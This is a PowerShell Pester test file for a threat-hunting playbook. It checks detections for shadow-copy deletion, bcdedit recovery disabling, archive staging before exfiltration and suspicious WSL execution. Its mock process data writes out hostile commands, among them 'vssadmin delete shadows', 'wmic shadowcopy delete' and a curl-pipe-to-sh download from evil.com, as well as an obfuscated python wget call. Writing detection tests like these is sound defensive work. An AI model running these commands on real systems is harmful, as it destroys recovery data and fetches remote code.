<#
.SYNOPSIS
    Phase 3 gap-fill tests -- impact and exfil-prep detections.
    All are behavior-based: the mechanism itself is the indicator, not the tool name.

    P3-3A  VSS deletion    (T1490)   -- vssadmin/wmic shadowcopy delete -> Critical
    P3-3B  Recovery disable (T1490)  -- bcdedit /set recoveryenabled|bootstatuspolicy -> High
    P3-3D  Archive staging  (T1560)  -- 7z/rar/Compress-Archive to staging path -> High
    P3-3E  WSL execution    (T1202)  -- wsl.exe cmdline invoking network/exec tools -> High
           WSL parent chain          -- Windows process spawned by wsl.exe/bash.exe -> High
#>

BeforeAll {
    $SrcPath = Join-Path $PSScriptRoot "..\..\playbooks\windows\threat_hunting\dev\src"
    . (Join-Path $SrcPath "00_Parameters_And_Globals.ps1")
    . (Join-Path $SrcPath "01_Process_And_Injection.ps1")

    function script:Set-P3BaselineMocks {
        Mock Get-Process      { @() }
        Mock Get-CimInstance  { @() }
        Mock Get-WmiObject    { @() }
    }

    function script:Make-Proc {
        param([int]$ProcId=9001, [string]$Name='cmd.exe', [string]$Cmd, [int]$PPid=4)
        [PSCustomObject]@{ ProcessId=$ProcId; Name=$Name; CommandLine=$Cmd; ParentProcessId=$PPid }
    }
}

# ---------------------------------------------------------------------------
# P3-3A: VSS / Shadow copy deletion (pre-ransomware / wiper indicator)
# Mechanism: the deletion of backup copies removes the victim's recovery path.
# ---------------------------------------------------------------------------
Describe "P3-3A VSS Shadow Copy Deletion" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P3BaselineMocks
    }

    It "Should flag 'vssadmin delete shadows /all /quiet' as Critical" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9001; Name='vssadmin.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9001 -Name 'vssadmin.exe' -Cmd 'vssadmin.exe delete shadows /all /quiet')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'VSS Deletion' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'Critical'
        $f[0].MITRE    | Should -Match 'T1490'
    }

    It "Should flag 'wmic shadowcopy delete' as Critical" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9002; Name='wmic.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9002 -Name 'wmic.exe' -Cmd 'wmic shadowcopy delete')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'VSS Deletion' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'Critical'
    }

    It "Should flag 'wmic shadowcopy call delete' variant as Critical" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9003; Name='wmic.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9003 -Name 'wmic.exe' -Cmd 'wmic shadowcopy call delete')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'VSS Deletion' }
        $f | Should -HaveCount 1
    }

    It "Should NOT flag 'vssadmin list shadows' (non-destructive query)" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9004; Name='vssadmin.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9004 -Name 'vssadmin.exe' -Cmd 'vssadmin list shadows')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'VSS Deletion' }) |
            Should -HaveCount 0
    }
}

# ---------------------------------------------------------------------------
# P3-3B: bcdedit recovery disable (removes OS recovery path)
# Mechanism: disabling recovery prevents victim restoring the system after ransomware/wiper.
# ---------------------------------------------------------------------------
Describe "P3-3B Recovery Disable (bcdedit)" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P3BaselineMocks
    }

    It "Should flag 'bcdedit /set {default} recoveryenabled no' as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9010; Name='bcdedit.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9010 -Name 'bcdedit.exe' -Cmd 'bcdedit /set {default} recoveryenabled no')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Recovery Disable' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1490'
    }

    It "Should flag 'bcdedit /set bootstatuspolicy ignoreallfailures' as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9011; Name='bcdedit.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9011 -Name 'bcdedit.exe' -Cmd 'bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Recovery Disable' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
    }

    It "Should NOT flag 'bcdedit /enum' (non-destructive query)" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9012; Name='bcdedit.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9012 -Name 'bcdedit.exe' -Cmd 'bcdedit /enum all')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'Recovery Disable' }) |
            Should -HaveCount 0
    }
}

# ---------------------------------------------------------------------------
# P3-3D: Archive staging (exfil preparation)
# Mechanism: creating a compressed archive in a staging path (Temp/AppData/Public)
# signals data collection before exfiltration -- regardless of which archiver is used.
# ---------------------------------------------------------------------------
Describe "P3-3D Archive Staging Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P3BaselineMocks
    }

    It "Should flag '7z.exe a' with output to Temp path as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9020; Name='7z.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9020 -Name '7z.exe' -Cmd '7z.exe a C:\Users\Public\loot.zip C:\sensitive\')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Archive Staging' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1560'
    }

    It "Should flag 'rar.exe a' with output to AppData as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9021; Name='rar.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9021 -Name 'rar.exe' -Cmd 'rar.exe a C:\Users\victim\AppData\Local\Temp\data.rar .')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Archive Staging' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
    }

    It "Should flag 'Compress-Archive' with destination to Public folder as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9022; Name='powershell.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9022 -Name 'powershell.exe' -Cmd 'powershell.exe -c Compress-Archive -Path C:\data -DestinationPath C:\Users\Public\out.zip')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Archive Staging' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
    }

    It "Should NOT flag '7z.exe a' with output to a legitimate backup directory" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9023; Name='7z.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9023 -Name '7z.exe' -Cmd '7z.exe a D:\Backups\daily.zip C:\data\')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'Archive Staging' }) |
            Should -HaveCount 0
    }

    It "Should NOT flag '7z.exe l' (list, no archive creation)" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9024; Name='7z.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9024 -Name '7z.exe' -Cmd '7z.exe l archive.zip')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'Archive Staging' }) |
            Should -HaveCount 0
    }
}

# ---------------------------------------------------------------------------
# P3-3E: WSL execution (T1202)
# Mechanism: WSL runs a full Linux kernel; ETW/EDR hooks on Windows don't cover Linux-side
# execution. Detect: (a) WSL cmdline invoking network/exec primitives; (b) wsl.exe in the
# high-risk parent list so Windows processes it spawns are escalated.
# ---------------------------------------------------------------------------
Describe "P3-3E WSL Execution Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P3BaselineMocks
    }

    It "Should flag 'wsl.exe -e bash -c curl|sh' as High (download and execute)" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9030; Name='wsl.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9030 -Name 'wsl.exe' -Cmd 'wsl.exe -e bash -c "curl http://evil.com/payload | sh"')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'WSL Suspicious Execution' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1202'
    }

    It "Should flag 'wsl.exe' invoking python with -c exec as High" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9031; Name='wsl.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9031 -Name 'wsl.exe' -Cmd 'wsl.exe python3 -c "import os; os.system(chr(119)+chr(103)+chr(101)+chr(116))"')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'WSL Suspicious Execution' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
    }

    It "Should flag a Windows process (cmd.exe) spawned by wsl.exe as High" {
        # Use script: scope so mock scriptblock captures vars correctly (Pester closure rule)
        $script:_p3WslProc = Make-Proc -ProcId 8888 -Name 'wsl.exe' -Cmd 'wsl.exe' -PPid 4
        $script:_p3CmdProc = Make-Proc -ProcId 9032 -Name 'cmd.exe' -Cmd 'cmd.exe /c whoami' -PPid 8888
        Mock Get-Process     { @([PSCustomObject]@{ Id=9032; Name='cmd.exe' }) }
        Mock Get-CimInstance { @($script:_p3WslProc, $script:_p3CmdProc) } `
            -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'WSL Parent Spawn' }
        $f | Should -Not -BeNullOrEmpty
        $f[0].Severity | Should -Be 'High'
    }

    It "Should NOT flag 'wsl.exe ls /tmp' (benign file listing)" {
        Mock Get-Process     { @([PSCustomObject]@{ Id=9033; Name='wsl.exe' }) }
        Mock Get-CimInstance {
            @(Make-Proc -ProcId 9033 -Name 'wsl.exe' -Cmd 'wsl.exe ls /tmp')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }

        Invoke-ProcessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'WSL Suspicious Execution' }) |
            Should -HaveCount 0
    }
}
